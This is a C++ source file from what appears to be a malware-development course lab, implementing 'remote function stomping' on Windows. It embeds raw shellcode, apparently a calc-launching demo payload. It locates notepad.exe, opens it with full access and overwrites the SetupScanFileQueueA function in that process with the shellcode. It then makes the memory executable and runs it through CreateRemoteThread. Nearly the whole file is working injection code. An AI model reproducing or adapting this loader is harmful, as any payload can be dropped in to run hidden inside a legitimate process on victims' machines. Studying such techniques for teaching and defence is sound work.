/*
* Lab 04 | Malware Dev Fall 2023
* Remote Function Stomping
* coremed | willjcim
*/

#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>
#include <SetupApi.h>

// we need to add "setupapi.dll" to our import address table (IAT) at compile time
#pragma comment (lib, "Setupapi.lib")

// shellcode
unsigned char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";


// function to get handle of remote process, returns BOOL
BOOL GetRemoteProcHandle(LPWSTR szProcName, DWORD *dwProcId, HANDLE *hProc) {
	// declare our Handle and ProcessEntry32
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 Proc;
	Proc.dwSize = sizeof(PROCESSENTRY32);

	// take a snapshot of all running processes
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// fetch info from first proc in the snapshot
	if (!Process32First(hSnapShot, &Proc)) {
		printf("Process32First Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// begin loop
	// iterate through all process in snapshot
	do {
		WCHAR lowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;
			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			// converting each charachter in Proc.szExeFile to a lower case character and saving it
			// in lowerName to do the *wcscmp* call later

			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++) {
					lowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				}
				// C strings are NULL terminated
				lowerName[i++] = '\0';
			}
		}

		// compare process snapshot path with process path from argument
		if (wcscmp(lowerName, szProcName) == 0) {
			// save PID
			*dwProcId = Proc.th32ProcessID;
			// open process handle and return
			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProc == NULL) {
				printf("OpenProcess Failed With Error : %d \n", GetLastError());
			}
			break;
		}
	// get next process, iterate
	} while (Process32Next(hSnapShot, &Proc));
	
	// check if our Handle is NULL, return
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcId == NULL || *hProc == NULL)
		return FALSE;
	return TRUE;
}


// function to write our shellcode to target location in remote process, returns BOOL
BOOL WriteShellcode(HANDLE hProc, PVOID pAddr, PBYTE pShellcode, SIZE_T sShellcodeSize) {
	// declare our DWORD and Size_T variables
	DWORD dwOldProtection = NULL;
	SIZE_T sBytesWritten = NULL;

	// change memory protection at target address to RW
	if (!VirtualProtectEx(hProc, pAddr, sShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// write payload to target address in remote proc
	if (!WriteProcessMemory(hProc, pAddr, pShellcode, sShellcodeSize, &sBytesWritten) || sShellcodeSize != sBytesWritten) {
		printf("WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("Bytes Written : %d of %d \n", sBytesWritten, sShellcodeSize);
		return FALSE;
	}

	// change memory protection at target address to RWX
	if (!VirtualProtectEx(hProc, pAddr, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main() {
	// define our target process
	wchar_t targetProc[] = L"notepad.exe";

	// delcare our vars
	HANDLE  hProc     = NULL;
	HANDLE  hThread   = NULL;
	DWORD   dwProcId  = NULL;
	HMODULE hModule   = NULL;

	// get handle and proc id of target remote process
	GetRemoteProcHandle(targetProc, &dwProcId, &hProc);

	// stomp function in target process
	WriteShellcode(hProc, &SetupScanFileQueueA, shellcode, sizeof(shellcode));

	// execute shellcode in remote process
	hThread = CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)SetupScanFileQueueA, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
	return 0;
}